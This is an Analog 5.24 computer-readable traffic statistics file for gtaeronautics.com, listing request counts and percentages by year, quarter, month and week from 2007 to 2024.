x	VE	analog 5.24
x	HN	gtaeronautics.com
x	PS	2024	05	29	02	08
x	FR	2007	12	18	17	05
x	LR	2024	05	28	04	55
x	E7	2024	05	29	02	08
x	SR	1933339
x	S7	7183
x	NC	654105
x	C7	0
x	FL	766570
x	F7	1534
x	RR	254
x	R7	0
x	NH	113099
x	H7	439
x	BT	57520368399
x	B7	0
1	Rr	329133	17.024	2024
1	Rr	511208	26.442	2023
1	Rr	82334	4.259	2022
1	Rr	98917	5.116	2021
1	Rr	89380	4.623	2020
1	Rr	80088	4.142	2019
1	Rr	68927	3.565	2018
1	Rr	60168	3.112	2017
1	Rr	73316	3.792	2016
1	Rr	80796	4.179	2015
1	Rr	110773	5.730	2014
1	Rr	65173	3.371	2013
1	Rr	60742	3.142	2012
1	Rr	57015	2.949	2011
1	Rr	22139	1.145	2010
1	Rr	69710	3.606	2009
1	Rr	71820	3.715	2008
1	Rr	1700	0.088	2007
1	*BT	R	511208	2023
Q	Rr	119701	6.191	2024	2
Q	Rr	209432	10.833	2024	1
Q	Rr	182268	9.428	2023	4
Q	Rr	165939	8.583	2023	3
Q	Rr	135306	6.999	2023	2
Q	Rr	27695	1.432	2023	1
Q	Rr	20307	1.050	2022	4
Q	Rr	20362	1.053	2022	3
Q	Rr	21795	1.127	2022	2
Q	Rr	19870	1.028	2022	1
Q	Rr	21154	1.094	2021	4
Q	Rr	26826	1.388	2021	3
Q	Rr	30675	1.587	2021	2
Q	Rr	20262	1.048	2021	1
Q	Rr	22199	1.148	2020	4
Q	Rr	23882	1.235	2020	3
Q	Rr	21656	1.120	2020	2
Q	Rr	21643	1.119	2020	1
Q	Rr	19098	0.988	2019	4
Q	Rr	19668	1.017	2019	3
Q	Rr	19827	1.026	2019	2
Q	Rr	21495	1.112	2019	1
Q	Rr	18129	0.938	2018	4
Q	Rr	17138	0.886	2018	3
Q	Rr	16928	0.876	2018	2
Q	Rr	16732	0.865	2018	1
Q	Rr	15937	0.824	2017	4
Q	Rr	0	0.000	2017	3
Q	Rr	16831	0.871	2017	2
Q	Rr	27400	1.417	2017	1
Q	Rr	22114	1.144	2016	4
Q	Rr	17621	0.911	2016	3
Q	Rr	15878	0.821	2016	2
Q	Rr	17703	0.916	2016	1
Q	Rr	16575	0.857	2015	4
Q	Rr	22104	1.143	2015	3
Q	Rr	22485	1.163	2015	2
Q	Rr	19632	1.015	2015	1
Q	Rr	21142	1.094	2014	4
Q	Rr	22272	1.152	2014	3
Q	Rr	31453	1.627	2014	2
Q	Rr	35906	1.857	2014	1
Q	Rr	16436	0.850	2013	4
Q	Rr	15216	0.787	2013	3
Q	Rr	16545	0.856	2013	2
Q	Rr	16976	0.878	2013	1
Q	Rr	16578	0.857	2012	4
Q	Rr	12511	0.647	2012	3
Q	Rr	15816	0.818	2012	2
Q	Rr	15837	0.819	2012	1
Q	Rr	15444	0.799	2011	4
Q	Rr	17386	0.899	2011	3
Q	Rr	9395	0.486	2011	2
Q	Rr	14790	0.765	2011	1
Q	Rr	1603	0.083	2010	4
Q	Rr	0	0.000	2010	3
Q	Rr	14047	0.727	2010	2
Q	Rr	6489	0.336	2010	1
Q	Rr	16350	0.846	2009	4
Q	Rr	18220	0.942	2009	3
Q	Rr	17115	0.885	2009	2
Q	Rr	18025	0.932	2009	1
Q	Rr	15905	0.823	2008	4
Q	Rr	15660	0.810	2008	3
Q	Rr	22448	1.161	2008	2
Q	Rr	17807	0.921	2008	1
Q	Rr	1700	0.088	2007	4
Q	*BT	R	209432	2024	1
m	Rr	56988	2.948	2024	05
m	Rr	62713	3.244	2024	04
m	Rr	66782	3.454	2024	03
m	Rr	68592	3.548	2024	02
m	Rr	74058	3.831	2024	01
m	Rr	54270	2.807	2023	12
m	Rr	61278	3.170	2023	11
m	Rr	66720	3.451	2023	10
m	Rr	51132	2.645	2023	09
m	Rr	54561	2.822	2023	08
m	Rr	60246	3.116	2023	07
m	Rr	66204	3.424	2023	06
m	Rr	60120	3.110	2023	05
m	Rr	8982	0.465	2023	04
m	Rr	10848	0.561	2023	03
m	Rr	8360	0.432	2023	02
m	Rr	8487	0.439	2023	01
m	Rr	6950	0.359	2022	12
m	Rr	6349	0.328	2022	11
m	Rr	7008	0.362	2022	10
m	Rr	6740	0.349	2022	09
m	Rr	6863	0.355	2022	08
m	Rr	6759	0.350	2022	07
m	Rr	6567	0.340	2022	06
m	Rr	8427	0.436	2022	05
m	Rr	6801	0.352	2022	04
m	Rr	6380	0.330	2022	03
m	Rr	6175	0.319	2022	02
m	Rr	7315	0.378	2022	01
m	Rr	7667	0.397	2021	12
m	Rr	7097	0.367	2021	11
m	Rr	6390	0.331	2021	10
m	Rr	6059	0.313	2021	09
m	Rr	9092	0.470	2021	08
m	Rr	11675	0.604	2021	07
m	Rr	10152	0.525	2021	06
m	Rr	10231	0.529	2021	05
m	Rr	10292	0.532	2021	04
m	Rr	7948	0.411	2021	03
m	Rr	5800	0.300	2021	02
m	Rr	6514	0.337	2021	01
m	Rr	8069	0.417	2020	12
m	Rr	6579	0.340	2020	11
m	Rr	7551	0.391	2020	10
m	Rr	8028	0.415	2020	09
m	Rr	7741	0.400	2020	08
m	Rr	8113	0.420	2020	07
m	Rr	7317	0.378	2020	06
m	Rr	6898	0.357	2020	05
m	Rr	7441	0.385	2020	04
m	Rr	7524	0.389	2020	03
m	Rr	7322	0.379	2020	02
m	Rr	6797	0.352	2020	01
m	Rr	6573	0.340	2019	12
m	Rr	5917	0.306	2019	11
m	Rr	6608	0.342	2019	10
m	Rr	6791	0.351	2019	09
m	Rr	6597	0.341	2019	08
m	Rr	6280	0.325	2019	07
m	Rr	6317	0.327	2019	06
m	Rr	6847	0.354	2019	05
m	Rr	6663	0.345	2019	04
m	Rr	7059	0.365	2019	03
m	Rr	6374	0.330	2019	02
m	Rr	8062	0.417	2019	01
m	Rr	6957	0.360	2018	12
m	Rr	5422	0.280	2018	11
m	Rr	5750	0.297	2018	10
m	Rr	5458	0.282	2018	09
m	Rr	5735	0.297	2018	08
m	Rr	5945	0.307	2018	07
m	Rr	7110	0.368	2018	06
m	Rr	6440	0.333	2018	05
m	Rr	3378	0.175	2018	04
m	Rr	5789	0.299	2018	03
m	Rr	5369	0.278	2018	02
m	Rr	5574	0.288	2018	01
m	Rr	3906	0.202	2017	12
m	Rr	6533	0.338	2017	11
m	Rr	5498	0.284	2017	10
m	Rr	0	0.000	2017	09
m	Rr	0	0.000	2017	08
m	Rr	0	0.000	2017	07
m	Rr	0	0.000	2017	06
m	Rr	6832	0.353	2017	05
m	Rr	9999	0.517	2017	04
m	Rr	11887	0.615	2017	03
m	Rr	7941	0.411	2017	02
m	Rr	7572	0.392	2017	01
m	Rr	9483	0.490	2016	12
m	Rr	7121	0.368	2016	11
m	Rr	5510	0.285	2016	10
m	Rr	6288	0.325	2016	09
m	Rr	5888	0.305	2016	08
m	Rr	5445	0.282	2016	07
m	Rr	5042	0.261	2016	06
m	Rr	5495	0.284	2016	05
m	Rr	5341	0.276	2016	04
m	Rr	5558	0.287	2016	03
m	Rr	5548	0.287	2016	02
m	Rr	6597	0.341	2016	01
m	Rr	5574	0.288	2015	12
m	Rr	5330	0.276	2015	11
m	Rr	5671	0.293	2015	10
m	Rr	6196	0.320	2015	09
m	Rr	6788	0.351	2015	08
m	Rr	9120	0.472	2015	07
m	Rr	7156	0.370	2015	06
m	Rr	5694	0.295	2015	05
m	Rr	9635	0.498	2015	04
m	Rr	6215	0.321	2015	03
m	Rr	6084	0.315	2015	02
m	Rr	7333	0.379	2015	01
m	Rr	6608	0.342	2014	12
m	Rr	6997	0.362	2014	11
m	Rr	7537	0.390	2014	10
m	Rr	7043	0.364	2014	09
m	Rr	7324	0.379	2014	08
m	Rr	7905	0.409	2014	07
m	Rr	11654	0.603	2014	06
m	Rr	9211	0.476	2014	05
m	Rr	10588	0.548	2014	04
m	Rr	7817	0.404	2014	03
m	Rr	15229	0.788	2014	02
m	Rr	12860	0.665	2014	01
m	Rr	5325	0.275	2013	12
m	Rr	5513	0.285	2013	11
m	Rr	5598	0.290	2013	10
m	Rr	4655	0.241	2013	09
m	Rr	4938	0.255	2013	08
m	Rr	5623	0.291	2013	07
m	Rr	5492	0.284	2013	06
m	Rr	5211	0.270	2013	05
m	Rr	5842	0.302	2013	04
m	Rr	6068	0.314	2013	03
m	Rr	5055	0.261	2013	02
m	Rr	5853	0.303	2013	01
m	Rr	5688	0.294	2012	12
m	Rr	5477	0.283	2012	11
m	Rr	5413	0.280	2012	10
m	Rr	4331	0.224	2012	09
m	Rr	3866	0.200	2012	08
m	Rr	4314	0.223	2012	07
m	Rr	4655	0.241	2012	06
m	Rr	6047	0.313	2012	05
m	Rr	5114	0.265	2012	04
m	Rr	6128	0.317	2012	03
m	Rr	5430	0.281	2012	02
m	Rr	4279	0.221	2012	01
m	Rr	5548	0.287	2011	12
m	Rr	4779	0.247	2011	11
m	Rr	5117	0.265	2011	10
m	Rr	5431	0.281	2011	09
m	Rr	6256	0.324	2011	08
m	Rr	5699	0.295	2011	07
m	Rr	5420	0.280	2011	06
m	Rr	3975	0.206	2011	05
m	Rr	0	0.000	2011	04
m	Rr	3608	0.187	2011	03
m	Rr	5171	0.267	2011	02
m	Rr	6011	0.311	2011	01
m	Rr	1603	0.083	2010	12
m	Rr	0	0.000	2010	11
m	Rr	0	0.000	2010	10
m	Rr	0	0.000	2010	09
m	Rr	0	0.000	2010	08
m	Rr	0	0.000	2010	07
m	Rr	4101	0.212	2010	06
m	Rr	5018	0.260	2010	05
m	Rr	4928	0.255	2010	04
m	Rr	5095	0.264	2010	03
m	Rr	1394	0.072	2010	02
m	Rr	0	0.000	2010	01
m	Rr	4665	0.241	2009	12
m	Rr	6187	0.320	2009	11
m	Rr	5498	0.284	2009	10
m	Rr	5066	0.262	2009	09
m	Rr	5718	0.296	2009	08
m	Rr	7436	0.385	2009	07
m	Rr	5685	0.294	2009	06
m	Rr	6120	0.317	2009	05
m	Rr	5310	0.275	2009	04
m	Rr	5515	0.285	2009	03
m	Rr	6123	0.317	2009	02
m	Rr	6387	0.330	2009	01
m	Rr	5763	0.298	2008	12
m	Rr	5420	0.280	2008	11
m	Rr	4722	0.244	2008	10
m	Rr	5435	0.281	2008	09
m	Rr	4843	0.250	2008	08
m	Rr	5382	0.278	2008	07
m	Rr	6082	0.315	2008	06
m	Rr	9946	0.514	2008	05
m	Rr	6420	0.332	2008	04
m	Rr	5431	0.281	2008	03
m	Rr	6469	0.335	2008	02
m	Rr	5907	0.306	2008	01
m	Rr	1700	0.088	2007	12
m	*BT	R	74058	2024	01
W	Rr	1150	0.059	2024	05	26
W	Rr	13203	0.683	2024	05	19
W	Rr	14346	0.742	2024	05	12
W	Rr	17520	0.906	2024	05	05
W	Rr	17624	0.912	2024	04	28
W	Rr	15605	0.807	2024	04	21
W	Rr	14394	0.745	2024	04	14
W	Rr	13500	0.698	2024	04	07
W	Rr	13599	0.703	2024	03	31
W	Rr	16024	0.829	2024	03	24
W	Rr	14040	0.726	2024	03	17
W	Rr	16854	0.872	2024	03	10
W	Rr	15624	0.808	2024	03	03
W	Rr	17778	0.920	2024	02	25
W	Rr	13428	0.695	2024	02	18
W	Rr	16572	0.857	2024	02	11
W	Rr	17070	0.883	2024	02	04
W	Rr	26220	1.356	2024	01	28
W	Rr	14730	0.762	2024	01	21
W	Rr	13098	0.677	2024	01	14
W	Rr	15324	0.793	2024	01	07
W	Rr	12552	0.649	2023	12	31
W	Rr	11406	0.590	2023	12	24
W	Rr	11184	0.578	2023	12	17
W	Rr	13956	0.722	2023	12	10
W	Rr	13644	0.706	2023	12	03
W	Rr	12390	0.641	2023	11	26
W	Rr	11682	0.604	2023	11	19
W	Rr	15756	0.815	2023	11	12
W	Rr	16596	0.858	2023	11	05
W	Rr	16104	0.833	2023	10	29
W	Rr	13980	0.723	2023	10	22
W	Rr	15450	0.799	2023	10	15
W	Rr	14713	0.761	2023	10	08
W	Rr	14285	0.739	2023	10	01
W	Rr	14478	0.749	2023	09	24
W	Rr	11904	0.616	2023	09	17
W	Rr	10968	0.567	2023	09	10
W	Rr	10482	0.542	2023	09	03
W	Rr	10800	0.559	2023	08	27
W	Rr	14568	0.754	2023	08	20
W	Rr	12504	0.647	2023	08	13
W	Rr	12076	0.625	2023	08	06
W	Rr	10997	0.569	2023	07	30
W	Rr	13392	0.693	2023	07	23
W	Rr	13224	0.684	2023	07	16
W	Rr	16128	0.834	2023	07	09
W	Rr	13356	0.691	2023	07	02
W	Rr	12558	0.650	2023	06	25
W	Rr	17082	0.884	2023	06	18
W	Rr	16452	0.851	2023	06	11
W	Rr	15336	0.793	2023	06	04
W	Rr	13482	0.697	2023	05	28
W	Rr	16248	0.840	2023	05	21
W	Rr	15078	0.780	2023	05	14
W	Rr	17181	0.889	2023	05	07
W	Rr	4282	0.221	2023	04	30
W	Rr	2458	0.127	2023	04	23
W	Rr	2269	0.117	2023	04	16
W	Rr	1553	0.080	2023	04	09
W	Rr	2389	0.124	2023	04	02
W	Rr	1701	0.088	2023	03	26
W	Rr	1943	0.100	2023	03	19
W	Rr	2225	0.115	2023	03	12
W	Rr	2192	0.113	2023	03	05
W	Rr	4055	0.210	2023	02	26
W	Rr	2406	0.124	2023	02	19
W	Rr	1898	0.098	2023	02	12
W	Rr	1890	0.098	2023	02	05
W	Rr	1861	0.096	2023	01	29
W	Rr	1686	0.087	2023	01	22
W	Rr	1779	0.092	2023	01	15
W	Rr	1833	0.095	2023	01	08
W	Rr	2226	0.115	2023	01	01
W	Rr	1280	0.066	2022	12	25
W	Rr	1806	0.093	2022	12	18
W	Rr	1773	0.092	2022	12	11
W	Rr	1532	0.079	2022	12	04
W	Rr	1586	0.082	2022	11	27
W	Rr	1093	0.057	2022	11	20
W	Rr	1366	0.071	2022	11	13
W	Rr	1972	0.102	2022	11	06
W	Rr	1396	0.072	2022	10	30
W	Rr	1547	0.080	2022	10	23
W	Rr	1641	0.085	2022	10	16
W	Rr	1747	0.090	2022	10	09
W	Rr	1568	0.081	2022	10	02
W	Rr	1379	0.071	2022	09	25
W	Rr	1695	0.088	2022	09	18
W	Rr	1701	0.088	2022	09	11
W	Rr	1568	0.081	2022	09	04
W	Rr	1562	0.081	2022	08	28
W	Rr	1488	0.077	2022	08	21
W	Rr	1646	0.085	2022	08	14
W	Rr	1430	0.074	2022	08	07
W	Rr	1446	0.075	2022	07	31
W	Rr	1383	0.072	2022	07	24
W	Rr	1661	0.086	2022	07	17
W	Rr	1478	0.076	2022	07	10
W	Rr	1711	0.088	2022	07	03
W	Rr	1804	0.093	2022	06	26
W	Rr	1298	0.067	2022	06	19
W	Rr	1407	0.073	2022	06	12
W	Rr	1396	0.072	2022	06	05
W	Rr	1638	0.085	2022	05	29
W	Rr	1724	0.089	2022	05	22
W	Rr	2427	0.126	2022	05	15
W	Rr	2100	0.109	2022	05	08
W	Rr	1414	0.073	2022	05	01
W	Rr	1865	0.096	2022	04	24
W	Rr	1381	0.071	2022	04	17
W	Rr	1630	0.084	2022	04	10
W	Rr	1670	0.086	2022	04	03
W	Rr	1588	0.082	2022	03	27
W	Rr	1204	0.062	2022	03	20
W	Rr	1350	0.070	2022	03	13
W	Rr	1488	0.077	2022	03	06
W	Rr	1368	0.071	2022	02	27
W	Rr	1481	0.077	2022	02	20
W	Rr	1657	0.086	2022	02	13
W	Rr	1518	0.079	2022	02	06
W	Rr	1787	0.092	2022	01	30
W	Rr	2021	0.105	2022	01	23
W	Rr	1429	0.074	2022	01	16
W	Rr	1693	0.088	2022	01	09
W	Rr	1541	0.080	2022	01	02
W	Rr	1311	0.068	2021	12	26
W	Rr	1839	0.095	2021	12	19
W	Rr	1732	0.090	2021	12	12
W	Rr	2001	0.103	2021	12	05
W	Rr	1641	0.085	2021	11	28
W	Rr	1615	0.084	2021	11	21
W	Rr	1673	0.087	2021	11	14
W	Rr	1625	0.084	2021	11	07
W	Rr	1523	0.079	2021	10	31
W	Rr	1562	0.081	2021	10	24
W	Rr	1474	0.076	2021	10	17
W	Rr	1349	0.070	2021	10	10
W	Rr	1615	0.084	2021	10	03
W	Rr	1598	0.083	2021	09	26
W	Rr	1646	0.085	2021	09	19
W	Rr	1203	0.062	2021	09	12
W	Rr	1106	0.057	2021	09	05
W	Rr	1383	0.072	2021	08	29
W	Rr	1685	0.087	2021	08	22
W	Rr	2071	0.107	2021	08	15
W	Rr	2279	0.118	2021	08	08
W	Rr	2374	0.123	2021	08	01
W	Rr	2543	0.132	2021	07	25
W	Rr	2843	0.147	2021	07	18
W	Rr	2777	0.144	2021	07	11
W	Rr	2756	0.143	2021	07	04
W	Rr	2524	0.131	2021	06	27
W	Rr	2466	0.128	2021	06	20
W	Rr	2262	0.117	2021	06	13
W	Rr	2264	0.117	2021	06	06
W	Rr	2101	0.109	2021	05	30
W	Rr	3009	0.156	2021	05	23
W	Rr	1989	0.103	2021	05	16
W	Rr	2386	0.123	2021	05	09
W	Rr	2138	0.111	2021	05	02
W	Rr	1668	0.086	2021	04	25
W	Rr	2413	0.125	2021	04	18
W	Rr	3035	0.157	2021	04	11
W	Rr	2709	0.140	2021	04	04
W	Rr	1942	0.100	2021	03	28
W	Rr	1666	0.086	2021	03	21
W	Rr	1476	0.076	2021	03	14
W	Rr	1713	0.089	2021	03	07
W	Rr	1777	0.092	2021	02	28
W	Rr	1173	0.061	2021	02	21
W	Rr	1101	0.057	2021	02	14
W	Rr	1699	0.088	2021	02	07
W	Rr	1867	0.097	2021	01	31
W	Rr	1404	0.073	2021	01	24
W	Rr	1564	0.081	2021	01	17
W	Rr	1431	0.074	2021	01	10
W	Rr	1666	0.086	2021	01	03
W	Rr	1926	0.100	2020	12	27
W	Rr	1572	0.081	2020	12	20
W	Rr	1404	0.073	2020	12	13
W	Rr	2272	0.118	2020	12	06
W	Rr	1522	0.079	2020	11	29
W	Rr	1722	0.089	2020	11	22
W	Rr	1580	0.082	2020	11	15
W	Rr	1401	0.072	2020	11	08
W	Rr	1499	0.078	2020	11	01
W	Rr	1470	0.076	2020	10	25
W	Rr	2379	0.123	2020	10	18
W	Rr	1559	0.081	2020	10	11
W	Rr	1729	0.089	2020	10	04
W	Rr	1674	0.087	2020	09	27
W	Rr	1786	0.092	2020	09	20
W	Rr	2200	0.114	2020	09	13
W	Rr	1677	0.087	2020	09	06
W	Rr	1596	0.083	2020	08	30
W	Rr	1833	0.095	2020	08	23
W	Rr	1814	0.094	2020	08	16
W	Rr	2206	0.114	2020	08	09
W	Rr	1397	0.072	2020	08	02
W	Rr	1816	0.094	2020	07	26
W	Rr	1949	0.101	2020	07	19
W	Rr	1532	0.079	2020	07	12
W	Rr	1976	0.102	2020	07	05
W	Rr	1600	0.083	2020	06	28
W	Rr	1627	0.084	2020	06	21
W	Rr	2101	0.109	2020	06	14
W	Rr	1590	0.082	2020	06	07
W	Rr	1492	0.077	2020	05	31
W	Rr	1556	0.080	2020	05	24
W	Rr	1756	0.091	2020	05	17
W	Rr	1568	0.081	2020	05	10
W	Rr	1567	0.081	2020	05	03
W	Rr	1734	0.090	2020	04	26
W	Rr	1675	0.087	2020	04	19
W	Rr	1702	0.088	2020	04	12
W	Rr	1965	0.102	2020	04	05
W	Rr	1329	0.069	2020	03	29
W	Rr	1818	0.094	2020	03	22
W	Rr	1345	0.070	2020	03	15
W	Rr	1581	0.082	2020	03	08
W	Rr	2014	0.104	2020	03	01
W	Rr	1942	0.100	2020	02	23
W	Rr	1748	0.090	2020	02	16
W	Rr	1949	0.101	2020	02	09
W	Rr	1683	0.087	2020	02	02
W	Rr	1436	0.074	2020	01	26
W	Rr	1792	0.093	2020	01	19
W	Rr	1519	0.079	2020	01	12
W	Rr	1420	0.073	2020	01	05
W	Rr	1109	0.057	2019	12	29
W	Rr	1023	0.053	2019	12	22
W	Rr	1584	0.082	2019	12	15
W	Rr	1783	0.092	2019	12	08
W	Rr	1704	0.088	2019	12	01
W	Rr	1178	0.061	2019	11	24
W	Rr	1697	0.088	2019	11	17
W	Rr	1510	0.078	2019	11	10
W	Rr	1383	0.072	2019	11	03
W	Rr	1309	0.068	2019	10	27
W	Rr	1473	0.076	2019	10	20
W	Rr	1519	0.079	2019	10	13
W	Rr	1485	0.077	2019	10	06
W	Rr	1416	0.073	2019	09	29
W	Rr	1499	0.078	2019	09	22
W	Rr	1652	0.085	2019	09	15
W	Rr	1710	0.088	2019	09	08
W	Rr	1485	0.077	2019	09	01
W	Rr	1689	0.087	2019	08	25
W	Rr	1315	0.068	2019	08	18
W	Rr	1619	0.084	2019	08	11
W	Rr	1558	0.081	2019	08	04
W	Rr	1360	0.070	2019	07	28
W	Rr	1191	0.062	2019	07	21
W	Rr	1730	0.089	2019	07	14
W	Rr	1299	0.067	2019	07	07
W	Rr	1339	0.069	2019	06	30
W	Rr	1592	0.082	2019	06	23
W	Rr	1497	0.077	2019	06	16
W	Rr	1450	0.075	2019	06	09
W	Rr	1555	0.080	2019	06	02
W	Rr	1289	0.067	2019	05	26
W	Rr	1863	0.096	2019	05	19
W	Rr	1385	0.072	2019	05	12
W	Rr	1553	0.080	2019	05	05
W	Rr	1655	0.086	2019	04	28
W	Rr	1282	0.066	2019	04	21
W	Rr	1503	0.078	2019	04	14
W	Rr	1623	0.084	2019	04	07
W	Rr	1715	0.089	2019	03	31
W	Rr	1882	0.097	2019	03	24
W	Rr	1464	0.076	2019	03	17
W	Rr	1381	0.071	2019	03	10
W	Rr	1627	0.084	2019	03	03
W	Rr	1773	0.092	2019	02	24
W	Rr	1669	0.086	2019	02	17
W	Rr	1483	0.077	2019	02	10
W	Rr	1391	0.072	2019	02	03
W	Rr	1797	0.093	2019	01	27
W	Rr	1963	0.102	2019	01	20
W	Rr	2029	0.105	2019	01	13
W	Rr	1696	0.088	2019	01	06
W	Rr	1526	0.079	2018	12	30
W	Rr	1226	0.063	2018	12	23
W	Rr	1442	0.075	2018	12	16
W	Rr	1936	0.100	2018	12	09
W	Rr	1809	0.094	2018	12	02
W	Rr	1295	0.067	2018	11	25
W	Rr	1820	0.094	2018	11	18
W	Rr	1802	0.093	2018	11	11
W	Rr	0	0.000	2018	11	04
W	Rr	1473	0.076	2018	10	28
W	Rr	1106	0.057	2018	10	21
W	Rr	1427	0.074	2018	10	14
W	Rr	1214	0.063	2018	10	07
W	Rr	1168	0.060	2018	09	30
W	Rr	1420	0.073	2018	09	23
W	Rr	1197	0.062	2018	09	16
W	Rr	1388	0.072	2018	09	09
W	Rr	1320	0.068	2018	09	02
W	Rr	1246	0.064	2018	08	26
W	Rr	1214	0.063	2018	08	19
W	Rr	1366	0.071	2018	08	12
W	Rr	1195	0.062	2018	08	05
W	Rr	1346	0.070	2018	07	29
W	Rr	1374	0.071	2018	07	22
W	Rr	1508	0.078	2018	07	15
W	Rr	1522	0.079	2018	07	08
W	Rr	909	0.047	2018	07	01
W	Rr	1444	0.075	2018	06	24
W	Rr	2682	0.139	2018	06	17
W	Rr	1365	0.071	2018	06	10
W	Rr	1329	0.069	2018	06	03
W	Rr	1275	0.066	2018	05	27
W	Rr	1392	0.072	2018	05	20
W	Rr	1321	0.068	2018	05	13
W	Rr	1527	0.079	2018	05	06
W	Rr	1517	0.078	2018	04	29
W	Rr	0	0.000	2018	04	22
W	Rr	1364	0.071	2018	04	15
W	Rr	1712	0.089	2018	04	08
W	Rr	0	0.000	2018	04	01
W	Rr	1543	0.080	2018	03	25
W	Rr	1342	0.069	2018	03	18
W	Rr	2429	0.126	2018	03	11
W	Rr	0	0.000	2018	03	04
W	Rr	1366	0.071	2018	02	25
W	Rr	1308	0.068	2018	02	18
W	Rr	1439	0.074	2018	02	11
W	Rr	1731	0.090	2018	02	04
W	Rr	0	0.000	2018	01	28
W	Rr	1434	0.074	2018	01	21
W	Rr	1578	0.082	2018	01	14
W	Rr	1471	0.076	2018	01	07
W	Rr	1246	0.064	2017	12	31
W	Rr	1033	0.053	2017	12	24
W	Rr	1103	0.057	2017	12	17
W	Rr	1406	0.073	2017	12	10
W	Rr	0	0.000	2017	12	03
W	Rr	1335	0.069	2017	11	26
W	Rr	1427	0.074	2017	11	19
W	Rr	1662	0.086	2017	11	12
W	Rr	1414	0.073	2017	11	05
W	Rr	1349	0.070	2017	10	29
W	Rr	1208	0.062	2017	10	22
W	Rr	2013	0.104	2017	10	15
W	Rr	1832	0.095	2017	10	08
W	Rr	0	0.000	2017	10	01
W	Rr	0	0.000	2017	09	24
W	Rr	0	0.000	2017	09	17
W	Rr	0	0.000	2017	09	10
W	Rr	0	0.000	2017	09	03
W	Rr	0	0.000	2017	08	27
W	Rr	0	0.000	2017	08	20
W	Rr	0	0.000	2017	08	13
W	Rr	0	0.000	2017	08	06
W	Rr	0	0.000	2017	07	30
W	Rr	0	0.000	2017	07	23
W	Rr	0	0.000	2017	07	16
W	Rr	0	0.000	2017	07	09
W	Rr	0	0.000	2017	07	02
W	Rr	0	0.000	2017	06	25
W	Rr	0	0.000	2017	06	18
W	Rr	0	0.000	2017	06	11
W	Rr	0	0.000	2017	06	04
W	Rr	25	0.001	2017	05	28
W	Rr	1838	0.095	2017	05	21
W	Rr	1915	0.099	2017	05	14
W	Rr	1676	0.087	2017	05	07
W	Rr	1677	0.087	2017	04	30
W	Rr	2071	0.107	2017	04	23
W	Rr	1978	0.102	2017	04	16
W	Rr	1874	0.097	2017	04	09
W	Rr	3435	0.178	2017	04	02
W	Rr	2619	0.135	2017	03	26
W	Rr	2633	0.136	2017	03	19
W	Rr	2413	0.125	2017	03	12
W	Rr	3092	0.160	2017	03	05
W	Rr	2295	0.119	2017	02	26
W	Rr	2204	0.114	2017	02	19
W	Rr	1869	0.097	2017	02	12
W	Rr	1973	0.102	2017	02	05
W	Rr	1783	0.092	2017	01	29
W	Rr	1768	0.091	2017	01	22
W	Rr	1585	0.082	2017	01	15
W	Rr	1768	0.091	2017	01	08
W	Rr	1740	0.090	2017	01	01
W	Rr	1549	0.080	2016	12	25
W	Rr	2202	0.114	2016	12	18
W	Rr	1812	0.094	2016	12	11
W	Rr	2648	0.137	2016	12	04
W	Rr	2236	0.116	2016	11	27
W	Rr	1321	0.068	2016	11	20
W	Rr	1996	0.103	2016	11	13
W	Rr	1716	0.089	2016	11	06
W	Rr	1564	0.081	2016	10	30
W	Rr	1362	0.070	2016	10	23
W	Rr	1707	0.088	2016	10	16
W	Rr	1696	0.088	2016	10	09
W	Rr	36	0.002	2016	10	02
W	Rr	2002	0.104	2016	09	25
W	Rr	1399	0.072	2016	09	18
W	Rr	1199	0.062	2016	09	11
W	Rr	1326	0.069	2016	09	04
W	Rr	1316	0.068	2016	08	28
W	Rr	1257	0.065	2016	08	21
W	Rr	1208	0.062	2016	08	14
W	Rr	1602	0.083	2016	08	07
W	Rr	1319	0.068	2016	07	31
W	Rr	1796	0.093	2016	07	24
W	Rr	1171	0.061	2016	07	17
W	Rr	1167	0.060	2016	07	10
W	Rr	917	0.047	2016	07	03
W	Rr	920	0.048	2016	06	26
W	Rr	1179	0.061	2016	06	19
W	Rr	1288	0.067	2016	06	12
W	Rr	1237	0.064	2016	06	05
W	Rr	1263	0.065	2016	05	29
W	Rr	1338	0.069	2016	05	22
W	Rr	1184	0.061	2016	05	15
W	Rr	1365	0.071	2016	05	08
W	Rr	974	0.050	2016	05	01
W	Rr	1311	0.068	2016	04	24
W	Rr	1127	0.058	2016	04	17
W	Rr	1248	0.065	2016	04	10
W	Rr	1451	0.075	2016	04	03
W	Rr	987	0.051	2016	03	27
W	Rr	1233	0.064	2016	03	20
W	Rr	1347	0.070	2016	03	13
W	Rr	1347	0.070	2016	03	06
W	Rr	1236	0.064	2016	02	28
W	Rr	1422	0.074	2016	02	21
W	Rr	1085	0.056	2016	02	14
W	Rr	1427	0.074	2016	02	07
W	Rr	1359	0.070	2016	01	31
W	Rr	1708	0.088	2016	01	24
W	Rr	1476	0.076	2016	01	17
W	Rr	1563	0.081	2016	01	10
W	Rr	1381	0.071	2016	01	03
W	Rr	1273	0.066	2015	12	27
W	Rr	1084	0.056	2015	12	20
W	Rr	1344	0.070	2015	12	13
W	Rr	1336	0.069	2015	12	06
W	Rr	1123	0.058	2015	11	29
W	Rr	960	0.050	2015	11	22
W	Rr	1337	0.069	2015	11	15
W	Rr	1400	0.072	2015	11	08
W	Rr	1383	0.072	2015	11	01
W	Rr	1250	0.065	2015	10	25
W	Rr	1366	0.071	2015	10	18
W	Rr	1367	0.071	2015	10	11
W	Rr	1214	0.063	2015	10	04
W	Rr	1152	0.060	2015	09	27
W	Rr	1387	0.072	2015	09	20
W	Rr	1655	0.086	2015	09	13
W	Rr	1526	0.079	2015	09	06
W	Rr	1242	0.064	2015	08	30
W	Rr	1800	0.093	2015	08	23
W	Rr	1527	0.079	2015	08	16
W	Rr	1386	0.072	2015	08	09
W	Rr	1593	0.082	2015	08	02
W	Rr	1567	0.081	2015	07	26
W	Rr	1980	0.102	2015	07	19
W	Rr	2180	0.113	2015	07	12
W	Rr	2008	0.104	2015	07	05
W	Rr	2297	0.119	2015	06	28
W	Rr	1556	0.080	2015	06	21
W	Rr	1380	0.071	2015	06	14
W	Rr	2013	0.104	2015	06	07
W	Rr	1651	0.085	2015	05	31
W	Rr	1224	0.063	2015	05	24
W	Rr	1355	0.070	2015	05	17
W	Rr	1179	0.061	2015	05	10
W	Rr	1436	0.074	2015	05	03
W	Rr	1671	0.086	2015	04	26
W	Rr	1878	0.097	2015	04	19
W	Rr	2326	0.120	2015	04	12
W	Rr	2636	0.136	2015	04	05
W	Rr	2297	0.119	2015	03	29
W	Rr	1237	0.064	2015	03	22
W	Rr	1453	0.075	2015	03	15
W	Rr	1399	0.072	2015	03	08
W	Rr	1287	0.067	2015	03	01
W	Rr	1249	0.065	2015	02	22
